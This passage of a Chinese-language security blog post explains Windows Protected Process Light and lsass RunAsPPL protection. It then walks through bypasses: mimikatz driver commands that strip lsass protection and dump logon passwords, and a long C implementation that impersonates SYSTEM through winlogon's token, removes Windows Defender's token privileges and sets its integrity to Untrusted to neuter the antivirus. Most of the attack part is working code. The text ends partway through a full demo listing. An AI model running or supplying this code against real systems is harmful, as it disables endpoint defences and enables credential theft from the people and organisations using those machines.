(NT_SUCCESS(ntStatus))</span><br><span class="line">	&#123;</span><br><span class="line">        Result2 = ProcessExtenedInfo.IsProtectedProcess == <span class="literal">false</span> &amp;&amp;</span><br><span class="line">		ProcessExtenedInfo.IsSecureProcess == <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Result2 &amp;&amp; Result1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>Pr.</th>
<th>Process</th>
<th>Type</th>
<th>Signer</th>
<th>Level</th>
</tr>
</thead>
<tbody><tr>
<td><strong>1</strong></td>
<td>wininit.exe</td>
<td>Protected Light</td>
<td>WinTcb</td>
<td>PsProtectedSignerWinTcb-Light</td>
</tr>
<tr>
<td><strong>2</strong></td>
<td>svchost.exe</td>
<td>Protected Light</td>
<td>Lsa</td>
<td>PsProtectedSignerWindows-Light</td>
</tr>
<tr>
<td><strong>3</strong></td>
<td>MsMpEng.exe</td>
<td>Protected Light</td>
<td>Antimalware</td>
<td>PsProtectedSignerAntimalwareLight</td>
</tr>
</tbody></table>
<p>上面的表中我们可以看见，PPL内部也是分级的</p>
<p>wininit.exe signer为WinTcb，它是 PPL 的最高可能值，那么它可以访问其他两个进程，然后， svchost.exe可以访问MsMpEng.exe，因为signer级别Lsa高于Antimalware，最后，MsMpEng.exe不 能访问其他两个进程，因为它具有最低级别，不能访问其他两个进程，因为它具有最低级别。</p>
<p>我们也可以去</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004095314442.png" alt="image-20241004095314442"></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004095344282.png" alt="image-20241004095344282"></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004095404405.png" alt="image-20241004095404405"></p>
<h2 id="LSA"><a href="#LSA" class="headerlink" title="LSA"></a>LSA</h2><p>LSA 即 RunAsPPL ，虽然 lsass 进程有 PPL ，微软为了防止非管理非 PPL 进程通过开放访问或篡改 PPL 进程中的代码和数据推出了 LSA ，但是在一般情况下是并没有启用的，有可能是防御方通过注册表打开了PPL，或者是EDR开了</p>
<p>这里我以我的win10虚拟机为例，可以看见这个lsass.exe进程是没有开启PPL保护的</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004101600573.png" alt="image-20241004101600573"></p>
<p>这时候我们使用mimikaz，密码是可以正常抓到的</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004102810423.png" alt="image-20241004102810423"></p>
<p>手动开启LSA的方法是，找到注册表里面的HKLM\SYSTEM\CurrentControlSet\Control\Lsa 然后添加一个 DWORD 值 RunAsPPL ，并把值从0改为1即可，之后重启电脑</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004103239039.png" alt="image-20241004103239039"></p>
<p>这时候我们再次打开Processmonitor，可以看见PPL已经被加上了</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004103549717.png" alt="image-20241004103549717"></p>
<p>这时候我们再去使用mimikaz抓密码，很明显，不行</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004104126564.png" alt="image-20241004104126564"></p>
<p>我们可以去gitee上找到mimikaz的源码，看看是怎么定义这个错误的</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004104636136.png" alt="image-20241004104636136"></p>
<p>可以看见这里也是使用OpenProcess来打开进程获得句柄，我们当然知道，这里低权限进程是没有办法打开高权限进程的</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004105011169.png" alt="image-20241004105011169"></p>
<p>之后if分支判断如果是INVALID_HANDLE_VALUE那么进入else分支，通过GetLastError把错误码打印出来，也就是我们看见的0x000005</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004105359518.png" alt="image-20241004105359518"></p>
<h2 id="mimdrv-sys"><a href="#mimdrv-sys" class="headerlink" title="mimdrv.sys"></a>mimdrv.sys</h2><p>mimikaz里面提供了mimidrv.sys来绕过，在加载之后就可以关闭LSA保护</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!+</span><br><span class="line">!procoessprotect /process:lsass.exe /remove</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>不过直到我复现的2024.10这个时间节点，这个驱动的证书已经被吊销</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004115143884.png" alt="image-20241004115143884"></p>
<h2 id="PPL-Fault"><a href="#PPL-Fault" class="headerlink" title="PPL Fault"></a>PPL Fault</h2><p>这里搬一个2023年4月份的项目，主要PPL Killer实在太老，一般这些PPL绕过的工具在公开了之后，很快就会被相关安全人员写入规则</p>
<p><a target="_blank" rel="noopener" href="https://github.com/gabriellandau/PPLFault">gabriellandau&#x2F;PPLFault (github.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">By Gabriel Landau at Elastic Security.</span><br><span class="line"></span><br><span class="line">From PPLdump Is Dead. Long Live PPLdump! presented at Black Hat Asia 2023.</span><br></pre></td></tr></table></figure>

<p>虽然现在应该是用不了了（正常打补丁的win），但是思路还是可以说一下</p>
<p>也是通过把WinTCb的ppl拿到，然后通过高权限（只要比Lsa高就行）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Acquired exclusive oplock to file: C:\Windows\System32\devobj.dll</span><br><span class="line"> [+] Ready.  Spawning WinTcb.</span><br><span class="line"> [+] SpawnPPL: Waiting for child process to finish.</span><br></pre></td></tr></table></figure>

<h2 id="PPL-medic"><a href="#PPL-medic" class="headerlink" title="PPL medic"></a>PPL medic</h2><p><a target="_blank" rel="noopener" href="https://github.com/itm4n/PPLmedic">https://github.com/itm4n/PPLmedic</a></p>
<p>也是一个公开的项目，应该也是被杀软标记了</p>
<h3 id="摘除Windows-defender的令牌"><a href="#摘除Windows-defender的令牌" class="headerlink" title="摘除Windows defender的令牌"></a>摘除Windows defender的令牌</h3><p><strong>这里要提一点，在Win Pc的版本中对Win Defender有补丁，所以测试环境移到Win Server 2019上进行</strong></p>
<p>通过Process Hacker查看WIndows Defender的令牌，我们可以看见如下</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004164708372.png" alt="image-20241004164708372"></p>
<p>我们可以看见Win Defender以System权限启动</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004164756434.png" alt="image-20241004164756434"></p>
<p>SYSTEM 用户可以完全控制令牌，这意味着，除非有其他机制保护令牌，否则以 SYSTEM 身份运行的线 程可以修改令牌，但是在windows中并没有保护令牌的机制，在 Process Hacker中 我们可以看到定义 的完整性为6种</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Untrusted – processes that are logged on anonymously are automatically designated</span><br><span class="line">as Untrusted</span><br><span class="line">    </span><br><span class="line">Low – The Low integrity level is the level used by <span class="keyword">default</span> <span class="keyword">for</span> interaction with the</span><br><span class="line">Internet. As <span class="type">long</span> as Internet Explorer is run in its <span class="keyword">default</span> state, Protected Mode, all files</span><br><span class="line">and processes associated with it are assigned the Low integrity level. Some folders,</span><br><span class="line">such as the Temporary Internet Folder, are also assigned the Low integrity level by</span><br><span class="line"><span class="keyword">default</span>.</span><br><span class="line">    </span><br><span class="line">Medium – Medium is the context that most objects will run in. Standard users receive</span><br><span class="line">the Medium integrity level, and any object not explicitly designated with a lower or</span><br><span class="line">higher integrity level is Medium by <span class="keyword">default</span>.</span><br><span class="line">    </span><br><span class="line">High – Administrators are granted the High integrity level. This ensures that</span><br><span class="line">Administrators are capable of interacting with and modifying objects assigned Medium</span><br><span class="line">or Low integrity levels, but can also act on other objects with a High integrity level,</span><br><span class="line">which standard users can not <span class="keyword">do</span>.</span><br><span class="line">    </span><br><span class="line">System – As the name implies, the System integrity level is reserved <span class="keyword">for</span> the system.</span><br><span class="line">The Windows kernel and core services are granted the System integrity level. Being</span><br><span class="line">even higher than the High integrity level of Administrators protects these core</span><br><span class="line">functions from being affected or compromised even by Administrators.</span><br><span class="line">    </span><br><span class="line">Installer – The Installer integrity level is a special <span class="keyword">case</span> and is the highest of all integrity</span><br><span class="line">levels. By virtue of being equal to or higher than all other WIC integrity levels, objects</span><br><span class="line">assigned the Installer integrity level are also able to uninstall all other objects.</span><br></pre></td></tr></table></figure>

<p>一般匿名登录的进程被自动指定为Untrusted</p>
<p>比如我们的浏览器，它在系统上执行一些特权操作时，实际上都不是浏览器本身执行，而是代理给到了其他非沙盒的进程来代表它来执行操作。如果在这种情况下沙盒进程被利用，那么其他它造成的损害就会比较有限，比如我们下载到了一些恶意软件，会很快被识别出来并被Win Defender隔离</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004193232650.png" alt="image-20241004193232650"></p>
<p>简而言之，Untrusted的进程对计算机的操作非常有限</p>
<p><strong>所以我们可以换一个思路，不一定要提升我们恶意软件的进程，也可以降低这些杀软的进程等级</strong></p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p><strong>核心函数</strong>（微软是给了demo的，但是要稍微改一下，名字叫做在 <strong>C++ 中启用和禁用特权</strong>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">SetPricilege</span><span class="params">(</span></span><br><span class="line"><span class="params">	HANDLE hToken,</span></span><br><span class="line"><span class="params">	LPCTSTR lpszPrivilege,</span></span><br><span class="line"><span class="params">	BOOL bEnablePrivilege</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	TOKEN_PRIVILEGES tp;</span><br><span class="line">	LUID luid;</span><br><span class="line">    <span class="comment">//检索本地唯一标识符</span></span><br><span class="line">	<span class="keyword">if</span>(!LookupPrivilegeValue(</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		lpszPrivilege,</span><br><span class="line">      	&amp;luid</span><br><span class="line">	))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LookupPricilegeValue Error:%d\n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span>(bEnablePrivilege)<span class="comment">//无论是否有bEnable标志，我们都设置特权标志为SE_PRIVILEGE_REMOVED，方便我们待会换掉原进程的令牌</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_REMOVED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_REMOVED;</span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(</span><br><span class="line">        hToken,</span><br><span class="line">        FALSE,</span><br><span class="line">        &amp;tp,</span><br><span class="line">        <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),</span><br><span class="line">        (PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,</span><br><span class="line">        (PDWORD)<span class="literal">NULL</span></span><br><span class="line">    ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges Error:%d\n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果失败返回FALSE</span></span><br><span class="line">    <span class="keyword">if</span>(GetLastError() == ERROR_NOT_ALL_ASSIGNED)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The token does not have the specified privilege\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面用到的结构和函数，我也是边看边学</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TOKEN_PRIVILEGES</span> &#123;</span></span><br><span class="line">  DWORD               PrivilegeCount;</span><br><span class="line">  LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];</span><br><span class="line">&#125; TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">AdjustTokenPrivileges</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]            HANDLE            TokenHandle,<span class="comment">//包含要修改的权限的访问令牌的句柄。 句柄必须具有TOKEN_ADJUST_PRIVILEGES令牌的访问权限</span></span></span><br><span class="line"><span class="params">  [in]            BOOL              DisableAllPrivileges,</span></span><br><span class="line"><span class="params">  [in, optional]  PTOKEN_PRIVILEGES NewState,<span class="comment">//指向 TOKEN_PRIVILEGES 结构的指针</span></span></span><br><span class="line"><span class="params">  [in]            DWORD             BufferLength,<span class="comment">//结构大小</span></span></span><br><span class="line"><span class="params">  [out, optional] PTOKEN_PRIVILEGES PreviousState,</span></span><br><span class="line"><span class="params">  [out, optional] PDWORD            ReturnLength</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>Return code</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><strong>ERROR_SUCCESS</strong></td>
<td>函数调整了所有指定的特权</td>
</tr>
<tr>
<td><strong>ERROR_NOT_ALL_ASSIGNED</strong></td>
<td>令牌不具有<em>NewState</em>参数中指定的一个或多个权限。即使没有调整特权，函数也可能成功执行此错误值。<em>PreviousState</em>参数指示已调整的权限。</td>
</tr>
</tbody></table>
<p>提权函数，启用当前进程的SE_DEBUG_NAME 权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">EnableDebugPrivilege</span><span class="params">()</span>&#123;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	LUID sedebugnameValue;</span><br><span class="line">	TOKEN_PRIVILEGES tkp;</span><br><span class="line">	<span class="keyword">if</span>(!OpenProcessToken(GetCurrentProcess(),TOEKN_ADJUST_PRIVILEGES | TOKEN_QUERY,&amp;hToken))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcessTokenError:%d\n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!LookupPrivilegeValue(<span class="literal">NULL</span>,SE_DEBUG_NAME,&amp;sedebugnameValue))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue Error:%d\n&quot;</span>,GetLastError());</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tkp,Privileges[<span class="number">0</span>].Luid = sedebugnameValue;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">if</span>(!AdjustTokenPrivileges(hToken,FALSE,&amp;tkp,<span class="keyword">sizeof</span>(tkp),<span class="literal">NULL</span>,<span class="literal">NULL</span>))&#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges Error:%d\n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面用到的api</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">OpenProcessToken</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HANDLE  ProcessHandle,<span class="comment">//打开访问令牌的进程句柄</span></span></span><br><span class="line"><span class="params">  [in]  DWORD   DesiredAccess,</span></span><br><span class="line"><span class="params">  [out] PHANDLE TokenHandle<span class="comment">//返回token的句柄</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>通过获取winlogon.exe这个进程的令牌，调用ImpersonateLoggedOnUser模拟系统用户获取权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wchar_t</span>  procname[<span class="number">80</span>] = <span class="string">L&quot;winlogon.exe&quot;</span>;</span><br><span class="line">	<span class="type">int</span> pid = getpid(procname);</span><br><span class="line">	HANDLE phandle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);</span><br><span class="line">	HANDLE ptoken;</span><br><span class="line">	OpenProcessToken(phandle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE,</span><br><span class="line">&amp;ptoken);<span class="comment">//拿到winlogon的权限</span></span><br><span class="line">	<span class="keyword">if</span> (ImpersonateLoggedOnUser(ptoken)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] Impersonated System!\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to impersonate System...\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">CloseHandle(phandle);<span class="comment">//防止泄漏</span></span><br><span class="line">CloseHandle(ptoken);</span><br></pre></td></tr></table></figure>

<p>在这之后，打开MsMpEng</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LUID sedebugnameValue;</span><br><span class="line"><span class="type">wchar_t</span> procname2[<span class="number">80</span>] = <span class="string">L&quot;MsMpEng.exe&quot;</span>;</span><br><span class="line">pid = getpid(procname2);</span><br><span class="line">phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);<span class="comment">//也就是这里有补丁，目前貌似在新版win里面打不开这个进程</span></span><br><span class="line"><span class="keyword">if</span> (phandle != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Opened Target Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open Process Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的PROCESS_QUERY_LIMITED_INFORMATION对应我们OpenProcessToken需要的权限，不需要多拿</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004203921715.png" alt="image-20241004203921715"></p>
<p>然后就是token的替换</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">BOOL token = OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &amp;ptoken);</span><br><span class="line"><span class="keyword">if</span> (token) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Opened Target Token Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open Target Token Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;sedebugnameValue);</span><br><span class="line">TOKEN_PRIVILEGES tkp;</span><br><span class="line"></span><br><span class="line">tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tkp.Privileges[<span class="number">0</span>].Luid = sedebugnameValue;</span><br><span class="line">tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!AdjustTokenPrivileges(ptoken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to Adjust Token&#x27;s Privileges\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之后调用SetPrivilege 将所有Token去掉</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_TCB_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);</span><br><span class="line">SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);</span><br></pre></td></tr></table></figure>

<p>SECURITY_MANDATORY_UNTRUSTED_RID 是一个常量，用于表示一个不受信任的安全完整性级别</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;</span><br></pre></td></tr></table></figure>

<p>然后再将完整性设置为 Untrusted ， Revision 为 SID_REVISION ，表示SID结构的版本号， SubAuthorityCount 为1，表示SID中子权限数组 SubAuthority 的元素数量， IdentifierAuthority.Value[5] 为16，表示用于表示完整性级别的标识符授权， SubAuthority[0] 为 integrityLevel ，表示进程的完整性级别，它是一个整数值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SID integrityLevelSid&#123;&#125;;</span><br><span class="line">integrityLevelSid.Revision = SID_REVISION;</span><br><span class="line">integrityLevelSid.SubAuthorityCount = <span class="number">1</span>;</span><br><span class="line">integrityLevelSid.IdentifierAuthority.Value[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">integrityLevelSid.SubAuthority[<span class="number">0</span>] = integrityLevel;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面SID结构的定义</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004204949424.png" alt="image-20241004204949424"></p>
<p>最后创建一个 TOKEN_MANDATORY_LABEL 结构体变量 tokenIntegrityLevel ，表示进程的安全令牌中的强制 完整性级别，然后通过 SetTokenInformation 将完整性设置为 Untrusted</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TOKEN_MANDATORY_LABEL tokenIntegrityLevel = &#123;&#125;;</span><br><span class="line">tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;</span><br><span class="line">tokenIntegrityLevel.Label.Sid = &amp;integrityLevelSid;</span><br><span class="line"><span class="keyword">if</span> (!SetTokenInformation(</span><br><span class="line">	ptoken,</span><br><span class="line">	TokenIntegrityLevel,</span><br><span class="line">	&amp;tokenIntegrityLevel,</span><br><span class="line">	<span class="keyword">sizeof</span>(TOKEN_MANDATORY_LABEL) + GetLengthSid(&amp;integrityLevelSid)))</span><br></pre></td></tr></table></figure>

<h3 id="完整demo"><a href="#完整demo" class="headerlink" title="完整demo"></a>完整demo</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 